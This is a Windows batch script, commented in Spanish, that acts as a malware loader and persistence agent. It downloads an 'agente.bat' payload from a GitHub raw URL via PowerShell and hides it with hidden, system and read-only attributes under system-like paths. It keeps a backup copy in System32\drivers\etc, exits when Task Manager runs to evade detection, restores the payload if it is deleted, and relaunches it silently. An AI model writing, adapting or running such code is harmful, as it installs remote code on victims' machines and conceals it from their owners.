@echo off
setlocal enabledelayedexpansion

:: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
set "VERSION_LOCAL=%VERSION_DIR%\v_data.txt"
:: Corregido el doble Roaming para que coincida con el instalador
set "AGENTE_DIR=%AppData%\Microsoft\Vault"
set "AGENTE_FILE=%AGENTE_DIR%\sys_engine.bat"   
set "BACKUP_DIR=%windir%\System32\drivers\etc\vps_logs"
set "VERSION_DIR=C:\Users\%USERNAME%\AppData\Roaming\Sun\Java\Deployment"
set "VLINEA=%temp%\v_data.txt"
set "MEM_DIR=%VERSION_DIR%"

:: URLs de GitHub
set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets"
set "URL_VERSION=%URL_BASE%/version.txt"
set "URL_AGENTE=%URL_BASE%/agente.bat"

:: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
:: Intentamos bajar la versión de la nube a un temporal
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VLINEA%')" >nul 2>&1

::
::
:: Si el archivo está vacío o no se descargó, morimos
if not exist "%VLINEA%" exit
for %%i in ("%VLINEA%") do if %%~zi == 0 (del "%VLINEA%" & exit)

set /p LINEA_NUBE=<"%VLINEA%"
:: 2. Comprobar si existe el archivo de memoria local
if exist "%VERSION_LOCAL%" (
    set /p LINEA_LOCAL=<"%VERSION_LOCAL%"
) else (
    copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
    set "LINEA_LOCAL=0"
) 
if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
    del "%VLINEA%"
    exit
) else (
    copy /y "%VLINEA%" "%VERSION_LOCAL%" >nul 2>&1
    del "%VLINEA%" 
)
::
::
:: Si la nube tiene una versión superior, descargamos el nuevo Agente

:: 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR
attrib -h -s -r "%AGENTE_FILE%" >nul 2>&1
attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
        
:: 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
:: Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
        
:: 2.3 RE-ACTIVACIÓN DE ESCUDOS
attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
    
 


:BUCLE_VIGILANCIA
:: --- 3. EVASIÓN (CENTINELA) ---
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>nul | find /I /N "taskmgr.exe" >nul
if "%errorlevel%"=="0" (
    exit
)

:: --- 4. RESTAURACIÓN Y EJECUCIÓN ---
:: Si el archivo no está (fue borrado manualmente), lo sacamos del Backup de System32
if not exist "%AGENTE_FILE%" (
    if not exist "%AGENTE_DIR%" mkdir "%AGENTE_DIR%" >nul 2>&1
    
    :: Restauramos y blindamos inmediatamente
    copy /y "%BACKUP_DIR%\sys_engine.bat" "%AGENTE_FILE%" >nul 2>&1
    attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
)

:: Si el Agente no está corriendo, lo lanzamos de forma silenciosa
tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
if %errorlevel% neq 0 (
    start /b "" cmd /c "%AGENTE_FILE%"
)
